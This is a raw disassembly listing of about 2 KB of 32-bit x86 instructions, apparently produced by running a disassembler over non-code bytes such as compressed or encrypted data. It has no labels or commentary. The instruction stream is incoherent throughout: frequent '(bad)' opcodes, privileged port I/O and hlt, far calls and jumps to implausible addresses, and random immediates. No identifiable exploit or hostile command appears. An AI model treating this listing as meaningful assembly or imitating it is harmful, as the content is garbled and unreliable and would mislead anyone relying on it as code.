  420102:	cmp    eax,0xc1b1ac10
  420107:	ja     0x42017f
  420109:	jnp    0x420177
  42010b:	inc    eax
  42010c:	mov    WORD PTR [esi-0x7e512b09],cs
  420112:	mov    ss,esp
  420114:	hlt    
  420115:	scas   al,BYTE PTR es:[edi]
  420116:	f2xm1  
  420118:	(bad)  
  420119:	push   cs
  42011a:	loopne 0x4200ad
  42011c:	push   eax
  42011d:	into   
  42011e:	inc    edi
  42011f:	sbb    al,BYTE PTR [eax]
  420121:	(bad)  
  420122:	push   edx
  420123:	jle    0x420152
  420125:	push   esp
  420126:	pop    esi
  420127:	retf   0x4a2f
  42012a:	aas    
  42012b:	ficom  DWORD PTR [edi]
  42012d:	sbb    DWORD PTR cs:[ecx+0x3e],ebp
  420131:	cmp    DWORD PTR [edi],0xffffff88
  420134:	fnstcw WORD PTR [ebp+0x43093beb]
  42013a:	std    
  42013b:	mov    dh,0x42
  42013d:	test   BYTE PTR [ebp-0x703b275d],bh
  420143:	adc    al,BYTE PTR [ebx-0x48]
  420146:	aad    0x8
  420148:	bound  ebp,QWORD PTR [edi-0x5f]
  42014b:	mov    BYTE PTR [edx],dl
  42014d:	std    
  42014e:	scas   al,BYTE PTR es:[edi]
  42014f:	int    0xb9
  420151:	and    DWORD PTR [eax+0x14],ebx
  420154:	or     BYTE PTR [ebx+0x79526c9d],cl
  42015a:	(bad)  
  42015b:	push   eax
  42015c:	inc    eax
  42015d:	ss mov dl,0xa3
  420160:	and    ah,BYTE PTR [ebx+edi*8+0x654f5249]
  420167:	sbb    DWORD PTR [ecx],ebp
  420169:	sub    DWORD PTR [ecx],ecx
  42016b:	test   BYTE PTR [edx+edi*1+0x1a],0x87
  420170:	lahf   
  420171:	ret    0xb561
  420174:	sub    al,0xfc
  420176:	scas   eax,DWORD PTR es:[edi]
  420177:	cld    
  420178:	mov    ah,0x6a
  42017a:	in     al,dx
  42017b:	jp     0x42013c
  42017d:	lods   al,BYTE PTR ds:[esi]
  42017e:	cmp    bl,BYTE PTR [eax]
  420180:	push   0xe9e48113
  420185:	mov    eax,ds:0xd6a4b230
  42018a:	add    DWORD PTR [edx],ebp
  42018c:	mov    bh,0x4d
  42018e:	sub    ebp,DWORD PTR [edx+eax*1]
  420191:	imul   ebx,DWORD PTR [ebx-0x32a11fd6],0xb1c2775
  42019b:	xor    edi,DWORD PTR [edi+ebp*2-0x6e407577]
  4201a2:	xor    BYTE PTR [eax+0x49d8b0d8],0x5d
  4201a9:	rcl    BYTE PTR [edi+0x13],cl
  4201ac:	xlat   BYTE PTR ds:[ebx]
  4201ad:	and    al,0x3a
  4201af:	stos   BYTE PTR es:[edi],al
  4201b0:	pop    es
  4201b1:	mov    edi,0x39f80046
  4201b6:	retf   
  4201b7:	mov    cl,0x10
  4201b9:	mov    esp,DWORD PTR [ecx+0x2e]
  4201bc:	adc    BYTE PTR [edx-0x65],al
  4201bf:	mov    WORD PTR gs:[ebx],ss
  4201c2:	push   eax
  4201c3:	ret    0x35a4
  4201c6:	(bad)  
  4201c7:	and    BYTE PTR ds:0x52c1193a,ch
  4201cd:	and    DWORD PTR [edi+0x892c5c],ecx
  4201d3:	popf   
  4201d4:	push   ebp
  4201d5:	mov    ebx,0x529540dd
  4201da:	cld    
  4201db:	inc    edx
  4201dc:	push   edx
  4201dd:	fpatan 
  4201df:	mov    esi,DWORD PTR ds:0x87ed79a4
  4201e5:	ror    BYTE PTR [ecx],cl
  4201e7:	push   esp
  4201e8:	or     BYTE PTR [edx],dh
  4201ea:	adc    eax,0x9d2645cb
  4201ef:	inc    ebp
  4201f0:	ror    DWORD PTR [eax],cl
  4201f2:	shl    BYTE PTR [eax+edx*2-0x3ab49339],0xc4
  4201fa:	xchg   esi,eax
  4201fb:	pop    ebx
  4201fc:	or     eax,0x2220124c
  420201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420202:	or     al,0xa4
  420204:	cdq    
  420205:	js     0x4201b5
  420207:	fcmovnb st,st(2)
  420209:	push   ebx
  42020a:	pop    edx
  42020b:	sub    eax,0xf07d9cec
  420210:	add    al,ah
  420212:	in     eax,dx
  420213:	das    
  420214:	out    dx,eax
  420215:	sbb    BYTE PTR [ebp-0x405bfbe9],cl
  42021b:	xor    al,0x13
  42021d:	rcl    BYTE PTR [ebx-0x7c],1
  420220:	pop    ebx
  420221:	fmul   DWORD PTR [ecx+0x27]
  420224:	mov    dl,0x13
  420226:	mov    bh,0x10
  420228:	dec    ebp
  420229:	outs   dx,DWORD PTR ds:[esi]
  42022a:	gs pop ds
  42022c:	std    
  42022d:	pop    ss
  42022e:	fld    TBYTE PTR [ebp+0x7f]
  420231:	test   eax,0x50408303
  420236:	and    al,0x1d
  420238:	pop    ss
  420239:	push   edi
  42023a:	test   eax,0xb3f84965
  42023f:	mov    esi,DWORD PTR [ecx+0x61]
  420242:	xor    cl,BYTE PTR gs:[eax]
  420245:	dec    eax
  420246:	adc    BYTE PTR [eax+eiz*4-0x1],bl
  42024a:	mul    BYTE PTR [edx+esi*4]
  42024d:	adc    DWORD PTR [edi],0xffffffb3
  420250:	sub    eax,0xe38913bf
  420255:	sbb    al,BYTE PTR [edi-0x2274b1a0]
  42025b:	bound  edi,QWORD PTR [edi]
  42025d:	xchg   BYTE PTR [ecx+0x1d6e12dc],ch
  420263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420264:	dec    ebx
  420265:	adc    esp,esi
  420267:	mov    ch,0x1
  420269:	cli    
  42026a:	jmp    0x42029d
  42026c:	xor    eax,DWORD PTR [ebx+edx*8+0x1e5c35ea]
  420273:	(bad)  
  420274:	mov    ds:0xa4c2a9d2,eax
  420279:	dec    ebx
  42027a:	ja     0x4202d3
  42027c:	mov    ecx,0x762a0986
  420281:	or     bh,0x2c
  420284:	adc    edx,DWORD PTR [eax+0x15c90825]
  42028a:	add    BYTE PTR [ecx],ah
  42028c:	push   eax
  42028d:	adc    al,0x9
  42028f:	enter  0xf601,0x65
  420293:	test   BYTE PTR [esi+0x52],ch
  420296:	test   edi,ecx
  420298:	(bad)  
  420299:	mov    dl,0x1d
  42029b:	xchg   eax,ecx
  42029d:	push   ds
  42029e:	sbb    al,0xba
  4202a0:	pop    es
  4202a1:	xor    edx,DWORD PTR [ebx+ecx*1-0x52990faf]
  4202a8:	mov    bh,BYTE PTR [ebx-0xd8e589a]
  4202ae:	or     DWORD PTR [ebx-0x2b],ebx
  4202b1:	fimul  DWORD PTR [eax+eax*1-0x48855023]
  4202b8:	lea    esp,[ecx]
  4202ba:	ss inc eax
  4202bc:	(bad)  
  4202bd:	out    0x27,eax
  4202bf:	sbb    esi,DWORD PTR [ebx+0x64b8bee8]
  4202c5:	cmp    ah,BYTE PTR [ecx]
  4202c7:	sbb    BYTE PTR [ecx+0x1b],0x71
  4202cb:	test   DWORD PTR ds:[bp+si+0x11],0x4c4953db
  4202d4:	sar    ebp,cl
  4202d6:	fcom   DWORD PTR [ecx]
  4202d8:	or     DWORD PTR [ebx+0x21387ec2],esp
  4202de:	sbb    eax,0xfd9848c4
  4202e3:	inc    esp
  4202e4:	mov    al,0x39
  4202e6:	xchg   ecx,eax
  4202e7:	sub    dl,ah
  4202e9:	gs jg  0x42027a
  4202ec:	push   ecx
  4202ed:	data16 loop 0x420354
  4202f0:	push   es
  4202f1:	das    
  4202f2:	pushf  
  4202f3:	aas    
  4202f4:	add    al,0x12
  4202f6:	or     BYTE PTR [eax-0x33528e45],dh
  4202fc:	sbb    BYTE PTR [eax-0x6b74cdb4],dh
  420302:	out    dx,eax
  420303:	test   DWORD PTR [ecx-0x1c5a47a2],0xc06cbc0f
  42030d:	cmp    eax,DWORD PTR ds:0x4b868f9
  420313:	movntps XMMWORD PTR [eax],xmm0
  420316:	sbb    al,0x4b
  420318:	stc    
  420319:	mov    ebp,0x30b46e8b
  42031e:	imul   ebp,DWORD PTR [ebx+0x515ed622],0xef35fecb
  420328:	or     edi,eax
  42032a:	loopne 0x420390
  42032c:	jb     0x420346
  42032e:	imul   esi,DWORD PTR [eax-0x58de975d],0x79
  420335:	xchg   DWORD PTR [ecx-0x22],ecx
  420338:	in     al,dx
  420339:	xchg   esp,eax
  42033a:	add    si,WORD PTR [edi]
  42033d:	lock out dx,al
  42033f:	jae    0x420395
  420341:	into   
  420342:	and    edx,DWORD PTR [eax+edi*8]
  420345:	and    DWORD PTR [edx],ecx
  420347:	inc    ecx
  420348:	xchg   edi,eax
  420349:	mov    bl,ch
  42034b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42034c:	adc    BYTE PTR [ecx+ebp*1+0x34303250],dl
  420353:	push   ds
  420354:	mov    fs,WORD PTR [eax]
  420356:	out    dx,al
  420357:	imul   DWORD PTR [ebx-0x58914d17]
  42035d:	cmp    DWORD PTR [eax-0x7e],0xffffffd4
  420361:	lahf   
  420362:	enter  0xa61e,0x12
  420366:	(bad)  
  420367:	icebp  
  420368:	ja     0x420329
  42036a:	ja     0x420350
  42036c:	outs   dx,BYTE PTR ds:[esi]
  42036d:	push   ebp
  42036e:	into   
  42036f:	mov    di,0x91d2
  420373:	jle    0x42030e
  420375:	jae    0x420308
  420377:	sbb    BYTE PTR [esi+0x2c54756a],bl
  42037d:	or     BYTE PTR [edi-0x2ed47721],0x75
  420384:	mov    al,ds:0xfbe49406
  420389:	and    ecx,DWORD PTR [ebp+0xcaa6916]
  42038f:	(bad)  
  420390:	mov    ecx,0x15364c2a
  420395:	adc    BYTE PTR [edi],dl
  420397:	inc    esp
  420398:	push   ss
  420399:	rcl    eax,0x82
  42039c:	repz ret 0x7af
  4203a0:	call   0xf89a:0xad2ee7aa
  4203a7:	add    DWORD PTR ds:0xaf0a5efd,ebp
  4203ad:	mov    WORD PTR [ecx+0x74],cs
  4203b0:	sub    al,dh
  4203b2:	or     DWORD PTR [esi-0x39214e95],edx
  4203b8:	mul    BYTE PTR [edx+eax*1+0xb]
  4203bc:	lea    eax,[esi-0x6e1c5d5e]
  4203c2:	or     BYTE PTR ds:0x754826db,dl
  4203c8:	pusha  
  4203c9:	repz imul DWORD PTR [edi-0x618f4857]
  4203d0:	add    al,0x1b
  4203d2:	lds    eax,FWORD PTR [ebx+0x78]
  4203d5:	imul   edi,DWORD PTR [edx],0x49
  4203d8:	add    DWORD PTR [ebx],edx
  4203da:	push   ss
  4203db:	inc    edx
  4203dc:	or     BYTE PTR [edx+0x42d0e0a7],0x76
  4203e3:	dec    edx
  4203e4:	fiadd  WORD PTR gs:[edi]
  4203e7:	push   0x4c
  4203e9:	inc    ebx
  4203ea:	cld    
  4203eb:	xlat   BYTE PTR ds:[ebx]
  4203ec:	lea    esp,[ecx]
  4203ee:	pop    ss
  4203ef:	and    eax,0xe0894d2a
  4203f4:	icebp  
  4203f5:	call   0xf1fa:0x8acf0740
  4203fc:	mov    edi,ebp
  4203fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203ff:	pop    edi
  420400:	or     DWORD PTR [eax],eax
  420402:	out    dx,al
  420403:	(bad)  
  420405:	mov    esp,0xa99a8303
  42040a:	test   eax,0x7c5e0138
  42040f:	sbb    cl,bh
  420411:	adc    DWORD PTR [edx-0x1e],ebx
  420414:	scas   eax,DWORD PTR es:[edi]
  420415:	dec    esi
  420416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420417:	xor    BYTE PTR [ebx+0x4b],al
  42041a:	pop    esp
  42041b:	imul   ebx,edx,0x954a9db8
  420421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420422:	and    bl,BYTE PTR [esp+eax*2+0x37403aa5]
  420429:	data16 xchg BYTE PTR [eax-0x6a],al
  42042d:	mov    al,ds:0x702692fb
  420432:	push   esi
  420433:	dec    ebp
  420434:	jns    0x420425
  420436:	loopne 0x4204b4
  420438:	not    bh
  42043a:	jmp    0x420485
  42043c:	jmp    0x9f00d280
  420441:	xchg   edi,eax
  420442:	(bad)  
  420443:	and    ch,BYTE PTR ds:0xc77ad20f
  420449:	fcomp  DWORD PTR [esi]
  42044b:	or     esi,ebp
  42044d:	push   cs
  42044e:	sti    
  42044f:	iret   
  420450:	rcl    BYTE PTR [eax-0x6c],0xa
  420454:	jmp    0x420479
  420456:	mov    al,ds:0x42567953
  42045b:	dec    ecx
  42045c:	int3   
  42045d:	adc    DWORD PTR [ebp*2-0x53a4c22],ebp
  420464:	(bad)  
  420465:	mov    dl,0x80
  420467:	xchg   esi,eax
  420468:	shr    BYTE PTR [edx+ebp*2+0x58],1
  42046c:	xchg   esi,eax
  42046d:	push   ss
  42046e:	cmp    BYTE PTR [ebp+eax*2+0x77],cl
  420472:	mov    BYTE PTR [edx],bh
  420474:	mov    dl,0x58
  420476:	dec    ecx
  420477:	sbb    BYTE PTR [eax-0x7f377074],ah
  42047d:	loopne 0x420425
  42047f:	fs pop eax
  420481:	or     eax,0x270b6edc
  420486:	mov    cl,0x9f
  420488:	jge    0x420420
  42048a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42048b:	repnz or dh,BYTE PTR [ebx]
  42048e:	sub    al,0x95
  420490:	retf   
  420491:	add    al,0x24
  420493:	mov    DWORD PTR ds:0x83fb248,edi
  420499:	pop    eax
  42049a:	in     al,dx
  42049b:	rcl    DWORD PTR [ebx-0x6d03e283],cl
  4204a1:	lods   al,BYTE PTR ds:[esi]
  4204a2:	sub    edx,DWORD PTR [esi]
  4204a4:	xchg   esi,eax
  4204a5:	mov    esi,0x5097ad27
  4204aa:	pusha  
  4204ab:	xor    cl,bl
  4204ad:	scas   al,BYTE PTR es:[edi]
  4204ae:	mov    edi,0xca01dc07
  4204b3:	inc    esp
  4204b4:	cwde   
  4204b5:	gs sbb al,0x8a
  4204b8:	inc    esi
  4204b9:	loope  0x4204de
  4204bb:	sub    ecx,DWORD PTR [ebx-0x76]
  4204be:	cmc    
  4204bf:	jo     0x420525
  4204c1:	in     al,dx
  4204c2:	inc    ecx
  4204c3:	cwde   
  4204c4:	call   0x716e:0x4d116783
  4204cb:	or     eax,0xf12f7ed5
  4204d0:	jne    0x420543
  4204d2:	repnz shl BYTE PTR [edx+ebp*2+0x72c617c],cl
  4204da:	rcl    DWORD PTR [ecx],cl
  4204dc:	fcom   QWORD PTR [ebp+esi*4+0x51]
  4204e0:	lods   eax,DWORD PTR ds:[esi]
  4204e1:	jbe    0x420537
  4204e3:	jl     0x42046b
  4204e5:	hlt    
  4204e6:	mov    eax,DWORD PTR [edx+ebp*2]
  4204e9:	jmp    0x3683871f
  4204ee:	loopne 0x42048d
  4204f0:	and    eax,0xe041a478
  4204f5:	popa   
  4204f6:	add    eax,DWORD PTR [eax-0x5081ac05]
  4204fc:	dec    edi
  4204fd:	cmp    esi,edx
  4204ff:	pop    ss
  420500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420501:	xor    edi,DWORD PTR [ecx-0x1f]
  420504:	test   eax,0x4a121edd
  420509:	add    bl,cl
  42050b:	lods   eax,DWORD PTR ds:[esi]
  42050c:	mov    ah,0x94
  42050e:	pop    edi
  42050f:	dec    edx
  420510:	pavgw  mm6,QWORD PTR [eax-0x59]
  420514:	test   eax,0xb43bd046
  420519:	(bad)  
  42051a:	fild   QWORD PTR [edi+0xbbdd5e4]
  420520:	mov    ah,0xe
  420522:	mov    bl,0x44
  420524:	icebp  
  420525:	jmp    0x42050f
  420527:	jnp    0x420517
  420529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42052a:	inc    ebp
  42052b:	int3   
  42052c:	repz popa 
  42052e:	adc    eax,0x7609f7e
  420533:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420534:	mov    edx,edx
  420536:	xor    cl,BYTE PTR [esi]
  420538:	xor    BYTE PTR [ecx-0x2c],cl
  42053b:	mov    dh,0x29
  42053d:	fs mov bl,0x8d
  420540:	ss jmp 0x69eab0fd
  420546:	fdiv   st,st(5)
  420548:	jecxz  0x42058e
  42054a:	mov    dl,0x0
  42054c:	mov    edx,esi
  42054e:	call   0x1d396c62
  420553:	xchg   ebp,eax
  420554:	sbb    BYTE PTR [ebx+0x1f],al
  420557:	push   edi
  420558:	addr16 mov bl,0xf8
  42055b:	aaa    
  42055c:	pop    edx
  42055d:	xchg   BYTE PTR [ebx-0x27ab966e],dl
  420563:	jmp    0x94a20f99
  420568:	ret    0xdd32
  42056b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42056c:	imul   eax,ecx,0xb
  42056f:	and    edx,DWORD PTR [edx+eax*8]
  420572:	jno    0x42057e
  420574:	mov    eax,0x5970ecb
  420579:	sub    BYTE PTR [esi],cl
  42057b:	fild   QWORD PTR [edi+0x27]
  42057e:	cli    
  42057f:	pop    ds
  420580:	scas   al,BYTE PTR es:[edi]
  420581:	ja     0x4205ec
  420583:	inc    ecx
  420584:	dec    esp
  420585:	pop    esp
  420586:	shr    BYTE PTR [esi],cl
  420588:	stos   DWORD PTR es:[edi],eax
  420589:	retf   0xb97f
  42058c:	data16 loop 0x4205c1
  42058f:	mov    edx,0xdad37700
  420594:	mov    DWORD PTR [ebx],0x1dbffa11
  42059a:	xor    al,0x28
  42059c:	jo     0x420587
  42059e:	and    BYTE PTR [ebp+0x4897df86],al
  4205a4:	imul   DWORD PTR [ebx+0x4e6dbac]
  4205aa:	pop    ebp
  4205ab:	sbb    esi,DWORD PTR [esi-0xf]
  4205ae:	push   esi
  4205af:	or     ah,BYTE PTR [ecx-0x7e]
  4205b2:	dec    edx
  4205b3:	cld    
  4205b4:	cs cli 
  4205b6:	mov    es,WORD PTR ds:0xd9bbf796
  4205bc:	add    al,0x76
  4205be:	dec    edx
  4205bf:	add    BYTE PTR [ebx],cl
  4205c1:	jmp    0x420618
  4205c3:	mov    eax,ds:0xb0db104b
  4205c8:	inc    ecx
  4205c9:	lods   eax,DWORD PTR ds:[esi]
  4205ca:	mov    ah,0x73
  4205cc:	push   0xb765acd
  4205d1:	add    DWORD PTR [edi+0x32a4252c],edi
  4205d7:	adc    DWORD PTR [eax],ebx
  4205d9:	gs int3 
  4205db:	mov    ds:0xad784044,eax
  4205e0:	mov    edi,0xdb04e789
  4205e5:	mov    eax,0x7b0740fa
  4205ea:	cli    
  4205eb:	add    BYTE PTR [eax+0x35ac04d7],ah
  4205f1:	or     eax,0x77fd5f78
  4205f6:	lods   al,BYTE PTR ds:[esi]
  4205f7:	xor    DWORD PTR [ecx],eax
  4205f9:	mov    ebp,0x453bca68
  4205fe:	sub    BYTE PTR [eax-0x63e036c3],ah
  420604:	into   
  420605:	mov    ds,esi
  420607:	dec    eax
  420608:	shl    ebp,cl
  42060a:	cmc    
  42060b:	xchg   ebx,eax
  42060c:	mov    dl,0xb8
  42060e:	push   ecx
  42060f:	dec    eax
  420610:	or     ch,bh
  420612:	push   edx
  420613:	in     eax,0xaf
  420615:	pop    ss
  420616:	fdiv   DWORD PTR [esi]
  420618:	lods   eax,DWORD PTR cs:[esi]
  42061a:	pop    esi
  42061b:	xchg   edi,eax
  42061c:	mov    dh,BYTE PTR [ecx-0x26d94d3e]
  420622:	repnz pop ecx
  420624:	mov    dh,0x45
  420626:	test   esi,ebp
  420628:	pop    ecx
  420629:	add    al,0xf9
  42062c:	push   edx
  42062d:	xchg   esi,eax
  42062e:	call   0x36303c67
  420633:	fs pop esi
  420635:	pop    ebx
  420636:	dec    eax
  420637:	jmp    0xc8f2507b
  42063c:	mov    bl,0x8f
  42063e:	test   BYTE PTR ds:0xd44ba289,al
  420644:	pop    esi
  420645:	pushf  
  420646:	fistp  WORD PTR [ebx-0x5f78254e]
  42064c:	cmp    dl,BYTE PTR [edx+0x557591ca]
  420652:	pusha  
  420653:	mov    eax,0x1a57cc5d
  420658:	sub    dl,al
  42065a:	retf   
  42065b:	(bad)  
  42065c:	addr16 inc ebp
  42065e:	inc    edx
  42065f:	add    dl,BYTE PTR [esi+0x24dfea8e]
  420665:	lea    eax,[edx-0x6b]
  420668:	ins    DWORD PTR es:[edi],dx
  420669:	and    eax,0x7e694a81
  42066e:	arpl   WORD PTR cs:[edi+eax*4],si
  420672:	stos   BYTE PTR es:[edi],al
  420673:	sub    eax,0xb126496c
  420678:	popf   
  420679:	(bad)  
  42067a:	loop   0x4206a3
  42067c:	cld    
  42067d:	int    0x5
  42067f:	and    DWORD PTR [edx],ebx
  420681:	mov    DWORD PTR [edi+ebx*1-0x2e68d129],eax
  420688:	loop   0x420681
  42068a:	sbb    eax,DWORD PTR [ecx+eiz*4+0x15a8b265]
  420691:	xchg   edi,eax
  420692:	push   esp
  420693:	fst    DWORD PTR [ebx]
  420695:	cld    
  420696:	mov    esi,0x6874f2c1
  42069b:	inc    eax
  42069c:	stos   BYTE PTR es:[edi],al
  42069d:	lods   eax,DWORD PTR ds:[esi]
  42069e:	push   cs
  42069f:	add    bh,BYTE PTR [esi+esi*4-0x38]
  4206a3:	popa   
  4206a4:	ss and bh,ch
  4206a7:	rol    ch,cl
  4206a9:	jo     0x4206df
  4206ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206ac:	push   es
  4206ad:	cwde   
  4206ae:	jecxz  0x420644
  4206b0:	xor    eax,0x1a327d97
  4206b5:	(bad)  
  4206b6:	and    dl,cl
  4206b8:	jle    0x420666
  4206ba:	repz cli 
  4206bc:	or     BYTE PTR [edi-0x6ff6eb21],ch
  4206c2:	cmc    
  4206c3:	mov    al,0x77
  4206c5:	sub    ebp,DWORD PTR ds:0x33eb6bc
  4206cb:	mov    bh,0xd0
  4206cd:	pop    ebx
  4206ce:	pop    ecx
  4206cf:	fimul  DWORD PTR [ecx-0x59620ffa]
  4206d5:	mov    DWORD PTR [esi-0x5b],edx
  4206d8:	lods   eax,DWORD PTR ds:[esi]
  4206d9:	sar    BYTE PTR [ecx-0x47],0x7f
  4206dd:	jp     0x4206b8
  4206df:	sbb    BYTE PTR [esi],0x1b
  4206e2:	lock scas al,BYTE PTR es:[edi]
  4206e4:	dec    edx
  4206e5:	jl     0x42068b
  4206e7:	inc    ecx
  4206e8:	loopne 0x42074b
  4206ea:	add    DWORD PTR [eax+0x3d7e53fb],eax
  4206f0:	fdiv   DWORD PTR [edi]
  4206f2:	fidivr DWORD PTR [edi]
  4206f4:	inc    ebp
  4206f5:	js     0x420745
  4206f7:	inc    ecx
  4206f8:	outs   dx,DWORD PTR ds:[esi]
  4206f9:	dec    edx
  4206fa:	(bad)
  4206fd:	aas    
  4206fe:	fwait
  4206ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420700:	out    dx,eax
  420701:	(bad)  
  420702:	xlat   BYTE PTR ds:[ebx]
  420703:	ja     0x420694
  420705:	dec    esp
  420706:	pusha  
  420707:	pop    esi
  420708:	push   esi
  420709:	fld    QWORD PTR ds:0x9b17ca42
  42070f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420710:	mov    edi,0xcca5497c
  420715:	xchg   BYTE PTR [edx-0x2c],dh
  420718:	mov    ah,bh
  42071a:	inc    ecx
  42071b:	shr    ch,cl
  42071d:	jmp    0x4206f7
  42071f:	popa   
  420720:	push   ecx
  420721:	(bad)  
  420722:	std    
  420723:	and    DWORD PTR [ebp-0x6ecbe55c],ebp
  420729:	pop    ecx
  42072a:	add    cl,BYTE PTR [ecx]
  42072c:	loop   0x420737
  42072e:	xchg   ebx,eax
  42072f:	fidiv  WORD PTR [ecx+0x405f5ca3]
  420735:	pop    ecx
  420736:	add    cl,BYTE PTR [ecx]
  420738:	mov    eax,ds:0xc672d06d
  42073d:	jecxz  0x4207a8
  42073f:	xor    eax,0xf302250d
  420744:	mov    ?,edx
  420746:	mov    esp,0x1d13945a
  42074b:	add    BYTE PTR [eax+0x564050b7],al
  420751:	call   0x9a88a525
  420756:	ja     0x420708
  420758:	and    DWORD PTR es:0x2ab6157e,0x41644d6
  420763:	add    eax,0x2fc9a064
  420768:	push   ecx
  420769:	jo     0x420779
  42076b:	or     dh,BYTE PTR [ebx+eax*1-0x3a]
  42076f:	jmp    0xa5e3774b
  420774:	nop
  420775:	loopne 0x420719
  420777:	pop    ecx
  420778:	pop    edx
  420779:	out    dx,al
  42077a:	dec    ebx
  42077b:	std    
  42077c:	push   ebp
  42077d:	(bad)
  420780:	pop    edi
  420781:	mul    ecx
  420783:	xor    bh,BYTE PTR [edx-0xc1678f9]
  420789:	xchg   al,ch
  42078b:	mov    dl,0x74
  42078d:	stc    
  42078e:	iret   
  42078f:	mov    eax,ds:0xc3271855
  420794:	nop
  420795:	test   DWORD PTR [esi],ebp
  420797:	mov    ss,ecx
  420799:	lds    edx,FWORD PTR [edx-0x4d]
  42079c:	test   DWORD PTR [ebp+0x56ab27f4],ebp
  4207a2:	sbb    eax,0xbf0be83b
  4207a7:	xchg   esp,eax
  4207a8:	xchg   esp,eax
  4207a9:	xor    DWORD PTR [edx+edi*8+0x2f],eax
  4207ad:	inc    ecx
  4207ae:	dec    esp
  4207af:	pop    edi
  4207b0:	into   
  4207b1:	les    esi,FWORD PTR [ecx]
  4207b3:	dec    edi
  4207b4:	mov    ebp,DWORD PTR [edi]
  4207b6:	(bad)  
  4207b7:	out    0x61,eax
  4207b9:	add    al,BYTE PTR [eax-0x7e]
  4207bc:	or     al,0x20
  4207be:	inc    ebp
  4207bf:	and    DWORD PTR ss:[ebx],esi
  4207c2:	adc    ebp,esp
  4207c4:	push   cs
  4207c5:	inc    ecx
  4207c6:	sub    eax,0x9e8257e0
  4207cb:	bnd ja 0x42075f
  4207ce:	xchg   esp,eax
  4207cf:	mov    cl,0xa
  4207d1:	ss inc eax
  4207d3:	xchg   al,al
  4207d5:	cmc    
  4207d6:	ja     0x42076b
  4207d8:	ss jle 0x420857
  4207db:	(bad)  
  4207dc:	sub    al,BYTE PTR [eax]
  4207de:	js     0x4207c3
  4207e0:	add    BYTE PTR [eax+esi*4-0x44],al
  4207e4:	add    DWORD PTR [eax+0xf],0x71bc0416
  4207eb:	add    bl,BYTE PTR [edx]
  4207ed:	add    al,0xf4
  4207ef:	adc    al,0xa1
  4207f1:	mov    al,0x37
  4207f3:	jno    0x4207d4
  4207f5:	cs nop
  4207f7:	shr    BYTE PTR [di],1
  4207fa:	stc    
  4207fb:	in     al,0x48
  4207fd:	or     al,0xcb
  4207ff:	push   ss
  420800:	add    DWORD PTR [eax-0x71113a2b],esp
  420806:	mov    ecx,ecx
  420808:	nop
  420809:	inc    ecx
  42080a:	retf   
  42080b:	out    dx,eax
  42080c:	and    BYTE PTR [edi],ch
  42080e:	inc    ecx
  42080f:	pop    ecx
  420810:	xor    al,0x85
  420812:	adc    ebx,ebx
  420814:	push   ebp
  420815:	xor    edx,DWORD PTR [edi]
  420817:	add    dh,BYTE PTR [esi+0x59]
  42081a:	mov    dl,0xa9
  42081c:	out    0xc9,eax
  42081e:	mov    ds:0xefc9a0a6,al
  420823:	pop    ebp
  420824:	aam    0x58
  420826:	mov    bh,0x2b
  420828:	add    al,0x28
  42082a:	lea    ebx,[esi-0x3c]
  42082d:	mov    ds:0xc8ed065f,eax
  420832:	retf   0x548a
  420835:	call   0x36ac8a8b
  42083a:	and    ch,BYTE PTR [ebp-0x1d]
  42083d:	push   ebx
  42083e:	and    DWORD PTR [eax-0x7d955f4e],0xffffffa0
  420845:	pop    edi
  420846:	push   ebx
  420847:	dec    esi
  420848:	mov    bl,0xb
  42084a:	pop    ebx
  42084b:	fcomp  DWORD PTR [eax]
  42084d:	inc    ecx
  42084e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42084f:	inc    ebp
  420850:	add    eax,0x29b13915
  420855:	add    DWORD PTR [ecx-0x22],ecx
  420858:	dec    edi
  420859:	fadd   QWORD PTR [ecx-0x23b404da]
  42085f:	les    esi,FWORD PTR [eax+eiz*1-0x72]
  420863:	cmp    ecx,DWORD PTR [ecx]
  420865:	mov    esi,0x172bde59
  42086a:	dec    ebp
  42086b:	pusha  
  42086c:	ffreep st(2)
  42086e:	and    al,BYTE PTR [edx-0x14]
  420871:	fist   DWORD PTR [ecx]
  420873:	(bad)  
  420874:	mov    dh,0x45
  420876:	arpl   bx,dx
  420878:	(bad)  
  420879:	jmp    FWORD PTR [edi-0x60]
  42087c:	out    dx,eax
  42087d:	pop    ds
  42087e:	loop   0x420833
  420880:	sub    esp,DWORD PTR [ebp+eiz*2+0x75]
  420884:	pop    edx
  420885:	jge    0x420810
  420887:	loopne 0x4208bd
  420889:	jns    0x4208d8
  42088b:	test   BYTE PTR [esi+ecx*8],ch
  42088e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42088f:	popa   
  420890:	mov    DWORD PTR [ecx-0x3a],edx
  420893:	xchg   esi,eax
  420894:	push   0xd
  420896:	or     al,0x25
  420898:	arpl   WORD PTR [eax-0x6b67df30],cx
  42089e:	mov    esp,DWORD PTR [eax]
  4208a0:	lahf   
  4208a1:	adc    eax,0x942c5523
  4208a6:	pop    ebx
  4208a7:	sbb    BYTE PTR [ecx-0x7d],ah
  4208aa:	dec    ebp
  4208ab:	cli    
  4208ac:	stc    
  4208ad:	sahf   
  4208ae:	cmc    
  4208af:	mov    DWORD PTR [ecx+0x1b],edx
  4208b2:	sahf   
  4208b3:	rcl    edi,0x53
  4208b6:	mov    ch,0x43
  4208b8:	mov    al,0x96
  4208ba:	sbb    eax,0x5ec9a310
  4208bf:	or     BYTE PTR [ebx+0x48],0x3b
  4208c3:	pop    ebx
  4208c4:	in     eax,0x9e
  4208c6:	bound  ebp,QWORD PTR [edi]
  4208c8:	jnp    0x420918
  4208ca:	out    dx,eax
  4208cb:	fadd   DWORD PTR [eax+0x23d3b337]
  4208d1:	or     eax,0x190f02
  4208d6:	push   ds
  4208d7:	mov    dl,dh
